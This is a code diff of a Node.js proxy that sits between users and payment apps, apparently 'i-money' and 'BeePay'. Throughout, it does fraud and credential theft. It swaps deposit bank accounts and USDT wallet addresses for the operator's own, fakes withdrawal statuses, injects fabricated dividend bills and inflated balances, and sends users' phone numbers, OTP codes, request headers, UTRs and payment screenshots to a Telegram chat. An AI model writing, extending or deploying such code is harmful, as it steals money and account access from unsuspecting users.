+    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
 
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch (e) {
-    console.error('Proxy+list replace error:', req.method, req.originalUrl, e.message);
-    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
-  }
-}
 
-app.post('/money/orderId', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, 'New Order!');
-});
-
-app.post('/money/create/v2', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, 'New Order (v2)!');
-});
-
-app.post('/money/init/order', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, 'Init Order!');
-});
-
-app.all('/money/order/list', async (req, res) => {
-  await proxyAndReplaceBankInList(req, res);
-});
-app.all('/money/list/v2', async (req, res) => {
-  await proxyAndReplaceBankInList(req, res);
-});
-app.all('/money/order/detail', async (req, res) => {
-  await proxyAndReplaceBankInList(req, res);
-});
-app.all('/money/orderDetail', async (req, res) => {
-  await proxyAndReplaceBankInList(req, res);
-});
-app.all('/money/rechargeRecord', async (req, res) => {
-  await proxyAndReplaceBankInList(req, res);
-});
-app.all('/payOrder/list', async (req, res) => {
-  const bankData = await loadData();
-  const statNames = { 0: 'Paying', 1: 'SUCCESS', 4: 'Expired' };
-
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-
-    if (jsonResp && Array.isArray(jsonResp.data) && jsonResp.data.length > 0) {
-      const items = jsonResp.data;
-      let changed = 0;
-      const changedDetails = [];
-
-      for (let i = 0; i < items.length; i++) {
-        const itemCustId = String(items[i].customerId || '');
-        const userOverride = bankData.userOverrides && bankData.userOverrides[itemCustId];
-        const perUserCount = userOverride && userOverride.withdrawCount ? userOverride.withdrawCount : 0;
-        const globalCount = bankData.withdrawOverride || 0;
-        const effectiveCount = perUserCount || globalCount;
-
-        if (effectiveCount <= 0) continue;
-
-        const userItems = items.filter(it => String(it.customerId || '') === itemCustId);
-        const userIndex = userItems.indexOf(items[i]);
-
-        if (userIndex < effectiveCount && items[i].stat !== 0) {
-          const oldStat = items[i].stat;
-          items[i].stat = 0;
-          changedDetails.push(`₹${(items[i].amount || 0) / 100} [${itemCustId}] (${statNames[oldStat] || 'stat=' + oldStat} → Paying)`);
-          changed++;
-        }
-      }
-
-      if (changed > 0) {
-        const newBody = JSON.stringify(jsonResp);
-
-        if (bankData.adminChatId && bot) {
-          bot.sendMessage(bankData.adminChatId,
-            `✅ Changed ${changed} withdrawal(s) to Paying:\n${changedDetails.join('\n')}`
-          ).catch(() => {});
-        }
-
-        respHeaders['content-type'] = 'application/json; charset=utf-8';
-        respHeaders['content-length'] = String(Buffer.byteLength(newBody));
-        respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
-        respHeaders['pragma'] = 'no-cache';
-        delete respHeaders['etag'];
-        delete respHeaders['last-modified'];
-        res.writeHead(200, respHeaders);
-        res.end(newBody);
-        return;
-      }
+    if (data.adminChatId && bot && !isLogOff(data, userId)) {
+      const savedBank = getOrderBankMultiple(data, allOrderIds);
+      const amount = rd.amount || rd.orderAmount || rd.payAmount || 'N/A';
+      const phone = getPhone(data, userId);
+      bot.sendMessage(data.adminChatId,
+`🔔 ${label}
+👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
+📋 Order: ${orderId}
+💰 Amount: ₹${amount}
+💳 Bank: ${savedBank ? savedBank.accountHolder + ' | ' + savedBank.accountNo : 'REAL'}
+🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+      ).catch(()=>{});
     }
-
-    sendJson(res, respHeaders, jsonResp, respBody);
-  } catch (e) {
-    console.error('payOrder/list proxy error:', e.message);
-    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
-  }
-});
-
-app.all('/money/withdrawRecord', async (req, res) => {
-  await proxyAndReplaceBankInList(req, res);
-});
-let savedForgetPassHeaders = null;
-
-app.all('/user/forgetPass', async (req, res) => {
-  try {
-    const bankData = await loadData();
-    const reqBody = req.parsedBody || {};
-    const rawStr = req.rawBody ? req.rawBody.toString().substring(0, 500) : '';
-
-    const capturedHeaders = {};
-    for (const [key, val] of Object.entries(req.headers)) {
-      const k = key.toLowerCase();
-      if (k === 'host' || k === 'connection' || k === 'content-length' ||
-          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
-      capturedHeaders[key] = val;
-    }
-    capturedHeaders['host'] = 'api.i-money.vip';
-    savedForgetPassHeaders = capturedHeaders;
-
-    if (bankData.adminChatId && bot) {
-      try {
-        await bot.sendMessage(bankData.adminChatId, `🔑 Password Reset!\nParsed: ${JSON.stringify(reqBody, null, 2).substring(0, 800)}\nRaw: ${rawStr}\n\n📤 REQUEST HEADERS:\n${JSON.stringify(capturedHeaders, null, 2).substring(0, 1500)}`);
-      } catch(e) {}
-    }
-
-    const { respHeaders, respBody, jsonResp } = await proxyFetch(req);
-
-    if (jsonResp && jsonResp.statusCode === '1023') {
-      if (bankData.adminChatId && bot) {
-        try { await bot.sendMessage(bankData.adminChatId, `❌ Wrong OTP: ${reqBody.smsCode || '?'}\nServer: Wrong SMS verification code`); } catch(e) {}
-      }
-      const errorResp = { status: 400, statusCode: '1023', statusInfo: 'Wrong SMS verification code', data: null, code: 0, msg: 'Wrong OTP' };
-      const errorBody = JSON.stringify(errorResp);
-      respHeaders['content-type'] = 'application/json; charset=utf-8';
-      respHeaders['content-length'] = String(Buffer.byteLength(errorBody));
-      res.writeHead(400, respHeaders);
-      res.end(errorBody);
-      return;
-    }
-
-    if (jsonResp && (jsonResp.statusCode === '0' || jsonResp.statusInfo === 'SUCCESS')) {
-      if (bankData.adminChatId && bot) {
-        try { await bot.sendMessage(bankData.adminChatId, `✅ Password Reset SUCCESS!\nPhone: ${reqBody.phone || '?'}\nOTP: ${reqBody.smsCode || '?'}`); } catch(e) {}
-      }
-    }
-
-    if (bankData.adminChatId && bot) {
-      try {
-        const dump = JSON.stringify(jsonResp || respBody, null, 2).substring(0, 1500);
-        const respHdrDump = JSON.stringify(respHeaders, null, 2).substring(0, 1500);
-        await bot.sendMessage(bankData.adminChatId, `🔑 forgetPass Response:\n📥 HEADERS:\n${respHdrDump}\n\n📥 BODY:\n${dump}`);
-      } catch(e) {}
-    }
-
-    sendJson(res, respHeaders, jsonResp, respBody);
-  } catch (e) {
-    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
-  }
-});
-
-app.all('/user/cashFlow', async (req, res) => {
-  await proxyAndReplaceBankInList(req, res);
-});
-
-app.post('/money/check/payStatus', async (req, res) => {
-  await proxyAndReplaceBankInList(req, res);
-});
-
-app.post('/login', async (req, res) => {
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const uid = extractUserId(req, jsonResp);
-    if (uid) saveTokenUserId(req, uid);
-    if (uid && jsonResp && jsonResp.data && jsonResp.data.token) {
-      tokenUserMap[jsonResp.data.token] = uid;
-    }
-    sendJson(res, respHeaders, jsonResp, respBody);
+    if (userId) { trackUser(data, userId, `Order ${orderId}`); saveData(data).catch(()=>{}); }
   } catch(e) {
-    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
+    console.error('proxyAndReplaceBankDetails error:', e.message);
+    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
   }
-});
-
-app.all('/user/*', async (req, res) => {
-  const path = req.path.toLowerCase();
-  if (path === '/user/cashflow') return await proxyAndReplaceBankInList(req, res);
-  await proxyAndAddBonus(req, res);
-});
-
-app.all('/smsCode', async (req, res) => {
-  try {
-    const bankData = await loadData();
-    const rawStr = req.rawBody ? req.rawBody.toString().substring(0, 1000) : '(empty)';
-    const parsedBody = req.parsedBody || {};
-
-    const url = ORIGINAL_API + req.originalUrl;
-    const forwardHeaders = {};
-    for (const [key, val] of Object.entries(req.headers)) {
-      const k = key.toLowerCase();
-      if (k === 'host' || k === 'connection' || k === 'content-length' ||
-          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
-      forwardHeaders[key] = val;
-    }
-    forwardHeaders['host'] = 'api.i-money.vip';
-    const opts = { method: req.method, headers: forwardHeaders };
-    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
-      opts.body = req.rawBody;
-      forwardHeaders['content-length'] = String(req.rawBody.length);
-    }
-    const response = await fetch(url, opts);
-
-    const allRespHeaders = {};
-    response.headers.forEach((val, key) => { allRespHeaders[key] = val; });
-
-    const respBody = await response.text();
-    let jsonResp = null;
-    try { jsonResp = JSON.parse(respBody); } catch(e) {}
-
-    if (bankData.adminChatId && bot) {
-      try {
-        const reqHdrDump = JSON.stringify(forwardHeaders, null, 2).substring(0, 1500);
-        const respHdrDump = JSON.stringify(allRespHeaders, null, 2).substring(0, 1500);
-        const bodyDump = JSON.stringify(jsonResp || respBody, null, 2).substring(0, 1500);
-        await bot.sendMessage(bankData.adminChatId, `📱 SMS OTP Request!\nURL: ${req.method} ${req.originalUrl}\n\n📤 REQUEST HEADERS:\n${reqHdrDump}`);
-        await bot.sendMessage(bankData.adminChatId, `📤 REQUEST BODY (raw):\n${rawStr}\n\n📤 REQUEST BODY (parsed):\n${JSON.stringify(parsedBody, null, 2).substring(0, 500)}`);
-        await bot.sendMessage(bankData.adminChatId, `📥 RESPONSE HEADERS:\n${respHdrDump}\n\n📥 RESPONSE BODY:\n${bodyDump}`);
-      } catch(e) {}
-    }
-
-    const cleanHeaders = {};
-    for (const [k, v] of Object.entries(allRespHeaders)) {
-      const kl = k.toLowerCase();
-      if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
-        cleanHeaders[k] = v;
-      }
-    }
-    sendJson(res, cleanHeaders, jsonResp, respBody);
-  } catch (e) {
-    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
-  }
-});
-
-
-function replaceUsdtInResponse(jsonResp, bankData, label) {
-  if (!bankData.usdtAddress || !jsonResp) return null;
-  const newAddr = bankData.usdtAddress;
-  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
-
-  function scanAndReplace(obj, depth) {
-    if (!obj || typeof obj !== 'object' || depth > 10) return;
-    if (Array.isArray(obj)) { obj.forEach(item => scanAndReplace(item, depth + 1)); return; }
-    let oldAddr = '';
-    for (const key of Object.keys(obj)) {
-      const kl = key.toLowerCase();
-      if (typeof obj[key] === 'string') {
-        if (kl.includes('usdt') && kl.includes('addr') || kl === 'address' || kl === 'customusdtaddress' || kl === 'walletaddress' || kl === 'addr') {
-          if (obj[key].length >= 20 && obj[key] !== newAddr) {
-            oldAddr = oldAddr || obj[key];
-            obj[key] = newAddr;
-          }
-        }
-        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrcodeurl') {
-          obj[key] = qrUrl;
-        }
-      } else if (typeof obj[key] === 'object') {
-        scanAndReplace(obj[key], depth + 1);
-      }
-    }
-    if (oldAddr) {
-      const escaped = oldAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-      const re = new RegExp(escaped, 'g');
-      for (const key of Object.keys(obj)) {
-        if (typeof obj[key] === 'string' && obj[key].includes(oldAddr)) {
-          obj[key] = obj[key].replace(re, newAddr);
-        }
-      }
-    }
-    return oldAddr;
-  }
-
-  let foundOld = '';
-  if (jsonResp.data) foundOld = scanAndReplace(jsonResp.data, 0) || '';
-  if (!foundOld) foundOld = scanAndReplace(jsonResp, 0) || '';
-  return { oldAddr: foundOld, newAddr, qrUrl };
 }
 
-app.all('/usdt', async (req, res) => {
+// Order list — bank replacement in list
+async function proxyAndReplaceBankInList(req, res) {
   try {
-    const bankData = await loadData();
-    const { respHeaders, respBody, jsonResp } = await proxyFetch(req);
-
-    if (jsonResp && bankData.adminChatId && bot && bankData.logRequests) {
-      try {
-        const target = jsonResp.data || jsonResp;
-        const dump = JSON.stringify(target, null, 2).substring(0, 3500);
-        await bot.sendMessage(bankData.adminChatId, `📋 /usdt BEFORE:\n${dump}`);
-      } catch(e) {}
+    const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
+      cachedData ? Promise.resolve(cachedData) : loadData(),
+      proxyFetch(req)
+    ]);
+    const userId = await extractUserId(req, jsonResp);
+    const eff = getEffectiveSettings(data, userId);
+    const listData = getResponseData(jsonResp);
+    if (listData && eff.botEnabled !== false) {
+      const applyToItem = (item) => {
+        const ids = [item.orderId, item.orderNo, item.id, item.inrOrderId].filter(Boolean);
+        const savedBank = getOrderBankMultiple(data, ids);
+        if (savedBank) deepReplace(item, savedBank, {}, 0);
+        if (eff.depositSuccess) markDepositSuccess(item);
+        if (eff.forceReviewSuccess) markReviewAsSuccess(item);
+      };
+      if (Array.isArray(listData)) listData.forEach(applyToItem);
+      else if (listData.list && Array.isArray(listData.list)) listData.list.forEach(applyToItem);
+      else if (listData.records && Array.isArray(listData.records)) listData.records.forEach(applyToItem);
+      else if (listData.rows && Array.isArray(listData.rows)) listData.rows.forEach(applyToItem);
     }
-
-    const result = replaceUsdtInResponse(jsonResp, bankData, '/usdt');
-
-    if (result && bankData.adminChatId && bot) {
-      try {
-        const target = jsonResp.data || jsonResp;
-        const afterDump = JSON.stringify(target, null, 2).substring(0, 2000);
-        await bot.sendMessage(bankData.adminChatId, `✅ /usdt AFTER:\n${afterDump}`);
-      } catch(e) {}
-    }
-
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch (e) {
-    console.error('USDT proxy error:', e.message);
-    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
-  }
-});
+  } catch(e) { await transparentProxy(req, res); }
+}
 
-app.all('/usdt/rate', async (req, res) => {
+// Fake bills injection
+async function proxyAndInjectFakeBills(req, res) {
   try {
-    const bankData = await loadData();
-    const { respHeaders, respBody, jsonResp } = await proxyFetch(req);
-
-    if (jsonResp && bankData.adminChatId && bot && bankData.logRequests) {
-      try {
-        const target = jsonResp.data || jsonResp;
-        const dump = JSON.stringify(target, null, 2).substring(0, 3500);
-        await bot.sendMessage(bankData.adminChatId, `📋 /usdt/rate dump:\n${dump}`);
-      } catch(e) {}
+    const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
+      cachedData ? Promise.resolve(cachedData) : loadData(),
+      proxyFetch(req)
+    ]);
+    const userId = await extractUserId(req, jsonResp);
+    const listData = getResponseData(jsonResp);
+    let items = [];
+    let itemsKey = null;
+    if (listData) {
+      if (Array.isArray(listData)) items = listData;
+      else if (listData.list && Array.isArray(listData.list)) { items = listData.list; itemsKey = 'list'; }
+      else if (listData.records && Array.isArray(listData.records)) { items = listData.records; itemsKey = 'records'; }
+      else if (listData.rows && Array.isArray(listData.rows)) { items = listData.rows; itemsKey = 'rows'; }
     }
-
-    replaceUsdtInResponse(jsonResp, bankData, '/usdt/rate');
+    let billUserId = userId;
+    if (!billUserId && data.fakeBills) {
+      const fbKeys = Object.keys(data.fakeBills).filter(k => data.fakeBills[k] && data.fakeBills[k].length > 0);
+      if (fbKeys.length === 1) billUserId = fbKeys[0];
+    }
+    const userBills = (data.fakeBills && billUserId && data.fakeBills[String(billUserId)]) || [];
+    if (userBills.length > 0) {
+      const template = items.length > 0 ? items[0] : null;
+      const fakeEntries = userBills.map(fb => {
+        const entry = template ? JSON.parse(JSON.stringify(template)) : {};
+        entry.orderNo = fb.orderNo;
+        entry.amount = fb.amount;
+        entry.orderType = 'Dividend';
+        entry.time = fb.createTime;
+        entry.createTime = fb.createTime;
+        entry.status = 1;
+        entry.statusText = 'Completed';
+        if (entry.id !== undefined) entry.id = fb.orderNo;
+        return entry;
+      });
+      fakeEntries.sort((a, b) => {
+        const fbA = userBills.find(f => f.orderNo === a.orderNo);
+        const fbB = userBills.find(f => f.orderNo === b.orderNo);
+        return (fbB ? fbB.timestamp : 0) - (fbA ? fbA.timestamp : 0);
+      });
+      items = [...fakeEntries, ...items];
+      if (itemsKey && listData) {
+        listData[itemsKey] = items;
+        if (listData.total !== undefined) listData.total = items.length;
+      } else if (jsonResp && jsonResp.data !== undefined) {
+        jsonResp.data = Array.isArray(jsonResp.data) ? items : jsonResp.data;
+      }
+    }
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch (e) {
-    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
-  }
+  } catch(e) { await transparentProxy(req, res); }
+}
+
+// ── BeePay specific routes ────────────────────────────────────────
+
+// Payment order — bank replacement (main deposit intercept)
+app.all('/appApi/orderOut/paying', async (req, res) => {
+  await proxyAndReplaceBankDetails(req, res, '💳 BeePay Payment Order');
 });
 
-app.all('/paymentAddr/*', async (req, res) => {
+app.all('/appApi/orderOut/getPayWallet', async (req, res) => {
+  await proxyAndReplaceBankDetails(req, res, '💳 BeePay Pay Wallet');
+});
+
+// Submit payment — UTR notification
+app.post('/appApi/orderOut/payingSubmit', async (req, res) => {
+  const data = await loadData();
   try {
-    const bankData = await loadData();
-    if (bankData.usdtAddress) {
-      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(bankData.usdtAddress)}`;
-      res.writeHead(302, { 'Location': qrUrl, 'Cache-Control': 'no-store, no-cache' });
-      res.end();
-      return;
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    const body = req.parsedBody || {};
+    if (data.adminChatId && bot && !isLogOff(data, userId)) {
+      const phone = getPhone(data, userId);
+      const utrVal = body.utr || body.trxId || body.transactionId || body.referenceNo || 'N/A';
+      const orderVal = body.orderId || body.orderNo || 'N/A';
+      bot.sendMessage(data.adminChatId, `📤 UTR Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nUTR: ${utrVal}\nOrder: ${orderVal}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
     }
-    await transparentProxy(req, res);
-  } catch (e) {
-    await transparentProxy(req, res);
+    if (userId) { trackUser(data, userId, `UTR ${body.utr || ''}`); saveData(data).catch(()=>{}); }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+// Submit payment with image
+app.post('/appApi/orderOut/payingSubmitImg', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    const body = req.parsedBody || {};
+    if (data.adminChatId && bot && !isLogOff(data, userId)) {
+      const phone = getPhone(data, userId);
+      const imgVal = body.imgUrl || body.imageUrl || '';
+      let msg = `🖼️ Payment Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nOrder: ${body.orderId || 'N/A'}`;
+      if (imgVal) msg += `\nImage: ${imgVal}`;
+      bot.sendMessage(data.adminChatId, msg).catch(()=>{});
+      if (imgVal) {
+        try {
+          const imgResp = await fetch(imgVal.startsWith('http') ? imgVal : ORIGINAL_API + '/' + imgVal);
+          if (imgResp.ok) {
+            const imgBuf = Buffer.from(await imgResp.arrayBuffer());
+            if (imgBuf.length > 100) {
+              await bot.sendPhoto(data.adminChatId, imgBuf, { caption: `📸 Payment [${userId || 'N/A'}]` }, { filename: 'payment.jpg', contentType: 'image/jpeg' });
+            }
+          }
+        } catch(e) {}
+      }
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+// Order detail
+app.all('/appApi/memberOrder/orderInDetail', async (req, res) => {
+  await proxyAndReplaceBankDetails(req, res, '📋 BeePay Order Detail');
+});
+
+// Create deposit order
+app.post('/app/api/orderOut/getPaymentOrder', async (req, res) => {
+  let data = null;
+  try {
+    const [d, proxyResult] = await Promise.all([
+      cachedData ? Promise.resolve(cachedData) : loadData(),
+      proxyFetch(req)
+    ]);
+    data = d;
+    const { respBody, respHeaders, jsonResp } = proxyResult;
+    const userId = await extractUserId(req, jsonResp);
+    const rd = getResponseData(jsonResp);
+    const body = req.parsedBody || {};
+    let newOrderId = '';
+    if (rd && typeof rd === 'object') {
+      newOrderId = rd.orderId || rd.orderNo || rd.id || '';
+    }
+    if (newOrderId) {
+      const eff = getEffectiveSettings(data, userId);
+      const rawAmt = body.amount || body.orderAmount || body.payAmount || '';
+      const orderAmt = parseFloat(rawAmt) || 0;
+      if (eff.botEnabled !== false && orderAmt > 0) {
+        const active = await getActiveBankAndSave(data, userId, orderAmt);
+        if (active) await saveOrderBank(data, newOrderId, active);
+        else await markOrderBankSkip(data, newOrderId);
+      } else if (eff.botEnabled !== false) {
+        await markOrderBankPending(data, newOrderId);
+      }
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+    if (data.adminChatId && bot) {
+      const phone = getPhone(data, userId);
+      bot.sendMessage(data.adminChatId, `⚠️ New Deposit Order\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\nAmount: ₹${body.amount || 'N/A'}\nOrder: ${newOrderId || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+    }
+  } catch(e) {
+    if (!res.headersSent) await transparentProxy(req, res);
   }
 });
 
-app.get('/health', async (req, res) => {
-  const bankData = await loadData();
-  const active = getActiveBank(bankData, null);
-  const idCount = Object.keys(bankData.userOverrides || {}).length;
-  res.json({ status: 'ok', bankActive: !!active, totalBanks: bankData.banks.length, adminSet: !!bankData.adminChatId, perIdOverrides: idCount });
+// Cancel order
+app.post('/appApi/orderOut/cancel', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    const body = req.parsedBody || {};
+    if (data.adminChatId && bot && !isLogOff(data, userId)) {
+      bot.sendMessage(data.adminChatId, `❌ Order Cancelled [${userId || 'N/A'}]\nOrder: ${body.orderId || body.orderNo || 'N/A'}`).catch(()=>{});
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
 });
 
-app.use(async (req, res) => {
+// Order list pages — bank replacement
+app.all('/appApi/memberOrder/orderInPage', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
+app.all('/appApi/memberOrder/inrOrderPage', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
+app.all('/appApi/orderOut/searchList', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
+
+// Balance / user info
+app.all('/appApi/member/basicInfo', async (req, res) => { await proxyAndAddBonus(req, res); });
+app.all('/appApi/member/balanceList', async (req, res) => { await proxyAndAddBonus(req, res); });
+app.all('/appApi/common/homeData', async (req, res) => { await proxyAndAddBonus(req, res); });
+
+// Transaction history — fake bills
+app.all('/appApi/memberOrder/usdtOrderPage', async (req, res) => { await proxyAndInjectFakeBills(req, res); });
+
+// USDT endpoints — USDT address replacement
+app.all('/appApi/orderUsdt/v2/info', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+app.all('/appApi/orderUsdt/v2/init', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
+    const userId = await extractUserId(req, jsonResp);
+    if (data.adminChatId && bot && userId) {
+      bot.sendMessage(data.adminChatId, `₮ USDT Order Init [${userId}]`).catch(()=>{});
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+app.post('/appApi/orderUsdt/v2/submit', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    const body = req.parsedBody || {};
+    if (data.adminChatId && bot && !isLogOff(data, userId)) {
+      bot.sendMessage(data.adminChatId, `₮ USDT Submit [${userId || 'N/A'}]\nAmount: ${body.amount || 'N/A'}\nTx: ${body.txHash || body.hash || 'N/A'}`).catch(()=>{});
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+app.post('/appApi/orderUsdt/v2/submitImg', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    const body = req.parsedBody || {};
+    if (data.adminChatId && bot && !isLogOff(data, userId)) {
+      const imgVal = body.imgUrl || body.imageUrl || '';
+      bot.sendMessage(data.adminChatId, `🖼️ USDT Screenshot [${userId || 'N/A'}]${imgVal ? '\n' + imgVal : ''}`).catch(()=>{});
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+// Wallet (UPI) endpoints — bank replacement
+app.all('/appApi/wallet/list', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
+app.all('/appApi/upi/list', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
+
+// Bank account endpoints — passthrough with USDT replace
+app.all('/app/api/memberManager/getBankAccount', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+// All other routes — transparent proxy
+app.all('*', async (req, res) => {
   await transparentProxy(req, res);
 });
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`BeePay proxy running on port ${PORT}`));
 
 module.exports = app;
